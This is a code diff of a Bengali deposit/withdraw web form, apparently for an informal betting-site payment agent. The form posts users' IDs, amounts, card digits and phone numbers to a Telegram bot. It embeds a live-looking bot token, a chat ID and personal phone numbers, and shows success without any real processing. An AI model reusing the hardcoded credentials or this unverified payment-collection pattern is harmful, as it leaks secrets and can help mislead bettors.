@@ -31,23 +31,14 @@ body{
   padding-bottom:120px;
 }
 
-/* TOP */
-.top-note{
-  overflow:hidden;
+/* LINK CARDS (REPLACED TOP NOTICE) */
+.link-card{
   background: rgba(14,165,233,0.15);
-  border-radius:12px;
+  border:1px solid rgba(14,165,233,0.25);
+  padding:12px;
+  border-radius:14px;
   margin-bottom:8px;
-}
-.top-note span{
-  display:inline-block;
-  padding:10px;
-  white-space:nowrap;
-  animation:slide 10s linear infinite;
-}
-
-@keyframes slide{
-  0%{transform:translateX(100%);}
-  100%{transform:translateX(-100%);}
+  text-align:center;
 }
 
 /* TABS */
@@ -95,40 +86,19 @@ body{
 }
 .method.active{border:1px solid #0ea5e9;}
 
-/* NUMBER CARD */
-.number-card{
-  display:none;
-  margin-top:10px;
-  margin-bottom:10px;
-  padding:15px;
-  border-radius:18px;
-  background:#020617;
-  border:1px dashed #0ea5e9;
-  text-align:center;
-  font-size:18px;
-}
-.number-card b{
-  font-size:22px;
-}
-
-/* INPUT (VISIBLE FIX) */
+/* INPUT */
 .row{
   display:flex;
   gap:8px;
 }
 .row input{
   flex:1;
-  min-width:0;
   padding:14px;
   border-radius:16px;
   background:linear-gradient(145deg,#0f172a,#020617);
   border:1px solid rgba(14,165,233,0.3);
   color:white;
   outline:none;
-  box-shadow:0 0 8px rgba(14,165,233,0.08);
-}
-.row input::placeholder{
-  color:#94a3b8;
 }
 
 /* BUTTON */
@@ -143,7 +113,7 @@ body{
   font-weight:600;
 }
 
-/* FLOAT */
+/* FLOAT AREA */
 .float-area{
   position:fixed;
   bottom:110px;
@@ -155,19 +125,7 @@ body{
   justify-content:space-between;
 }
 
-.left-btn{
-  overflow:hidden;
-  background: rgba(14,165,233,0.15);
-  border-radius:12px;
-  width:160px;
-}
-.left-btn span{
-  display:inline-block;
-  padding:10px;
-  white-space:nowrap;
-  animation:slide 10s linear infinite;
-}
-
+/* WHATSAPP FLOAT ANIMATION */
 .whatsapp{
   width:60px;
   height:60px;
@@ -176,6 +134,13 @@ body{
   display:flex;
   justify-content:center;
   align-items:center;
+  animation:float 3s ease-in-out infinite;
+}
+
+@keyframes float{
+  0%{transform:translateY(0);}
+  50%{transform:translateY(-6px);}
+  100%{transform:translateY(0);}
 }
 
 /* LOADER */
@@ -202,9 +167,10 @@ body{
 
 <div class="container">
 
-<div class="top-note">
-  <span>⏳ অনুগ্রহ করে অপেক্ষা করুন, আপনার ডিপোজিট প্রক্রিয়াধীন...</span>
-</div>
+<!-- LINKS -->
+<div class="link-card">bjwala.co</div>
+<div class="link-card">9xbet9.live</div>
+<div class="link-card">velki247.live</div>
 
 <div class="tabs">
   <div class="tab active" onclick="showTab('deposit', event)">Deposit</div>
@@ -219,8 +185,6 @@ body{
     <div class="method" onclick="selectMethod(this,'deposit')">নগদ</div>
     <div class="method" onclick="selectMethod(this,'deposit')">রকেট</div>
   </div>
-
-  <div class="number-card" id="numberCard"></div>
 
   <div class="row">
     <input type="text" id="d_userid" placeholder="ইউজার ID">
@@ -257,9 +221,7 @@ body{
 
 <!-- FLOAT -->
 <div class="float-area">
-  <div class="left-btn">
-    <span>বাজিওয়াল 9xbet ভেল্কি সকল সাইডের লিংক সমূহ •</span>
-  </div>
+  <div></div>
 
   <a href="https://wa.me/+855969610245" target="_blank">
     <div class="whatsapp">
@@ -269,7 +231,7 @@ body{
 </div>
 
 <script>
-const botToken = "8216213984:AAFCOQsGouXgnit2vKR6Rv8-VonSYL7_irk";
+const botToken = "8216213984:AAFCOQsGouXgnit2vR8-VonSYL7_irk";
 const chatId = "8406979793";
 
 let orderCounter = 23;
@@ -280,6 +242,19 @@ function generateOrderId(){
   return "#" + (orderCounter++);
 }
 
+/* RESET FUNCTION */
+function resetDeposit(){
+  d_userid.value="";
+  d_amount.value="";
+  d_last.value="";
+}
+
+function resetWithdraw(){
+  w_userid.value="";
+  w_amount.value="";
+  w_number.value="";
+}
+
 /* DEPOSIT */
 function sendDeposit(){
   loader.style.display="block";
@@ -288,20 +263,19 @@ function sendDeposit(){
     let id = generateOrderId();
 
     let msg = `📥 Deposit Request
-━━━━━━━━━━━━
 🆔 Order ID: ${id}
 💳 Method: ${selectedDeposit}
 👤 User ID: ${d_userid.value}
 💰 Amount: ${d_amount.value}
-🔢 Last 4 Digit: ${d_last.value}
-📅 ${new Date().toLocaleString()}
-━━━━━━━━━━━━`;
+🔢 Last 4 Digit: ${d_last.value}`;
 
     sendToTelegram(msg);
 
     success1.innerHTML = `✅ সফল হয়েছে<br>Order ID: ${id}`;
     success1.style.display="block";
     loader.style.display="none";
+
+    resetDeposit(); // ✅ FIX
   },1500);
 }
 
@@ -313,24 +287,22 @@ function sendWithdraw(){
     let id = generateOrderId();
 
     let msg = `📤 Withdraw Request
-━━━━━━━━━━━━
 🆔 Order ID: ${id}
 💳 Method: ${selectedWithdraw}
 👤 User ID: ${w_userid.value}
 💰 Amount: ${w_amount.value}
-📱 Number: ${w_number.value}
-📅 ${new Date().toLocaleString()}
-━━━━━━━━━━━━`;
+📱 Number: ${w_number.value}`;
 
     sendToTelegram(msg);
 
     success2.innerHTML = `✅ সফল হয়েছে<br>Order ID: ${id}`;
     success2.style.display="block";
     loader2.style.display="none";
+
+    resetWithdraw(); // ✅ FIX
   },1500);
 }
 
-/* TELEGRAM */
 function sendToTelegram(message){
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
     method:"POST",
@@ -339,7 +311,6 @@ function sendToTelegram(message){
   });
 }
 
-/* METHOD SELECT */
 function selectMethod(el,type){
   let parent = type==='deposit'?depositMethods:withdrawMethods;
   parent.querySelectorAll('.method').forEach(m=>m.classList.remove('active'));
@@ -347,14 +318,11 @@ function selectMethod(el,type){
 
   if(type==='deposit'){
     selectedDeposit = el.innerText;
-    numberCard.innerHTML = `<b>01316616956</b><br>ক্যাশ আউট করুন`;
-    numberCard.style.display="block";
   }else{
     selectedWithdraw = el.innerText;
   }
 }
 
-/* TAB */
 function showTab(tab,e){
   deposit.style.display='none';
   withdraw.style.display='none';
